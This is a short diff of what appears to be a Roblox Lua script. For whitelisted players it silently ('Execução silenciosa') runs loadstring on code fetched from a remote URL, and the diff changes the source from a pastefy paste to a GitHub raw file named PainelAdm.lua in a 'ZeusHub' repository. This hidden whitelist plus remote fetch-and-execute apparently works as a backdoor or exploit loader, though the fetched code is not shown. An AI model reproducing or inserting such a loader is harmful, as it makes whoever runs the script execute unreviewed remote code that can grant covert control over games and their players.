@@ -159,5 +159,5 @@ local Whitelist = {
 
 --// Execução silenciosa
 if Whitelist[LocalPlayer.Name] then
-    loadstring(game:HttpGet("https://pastefy.app/zgfvPHpB/raw", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Miguel918-hub/ZeusHub/refs/heads/main/PainelAdm.lua",true))()
 end
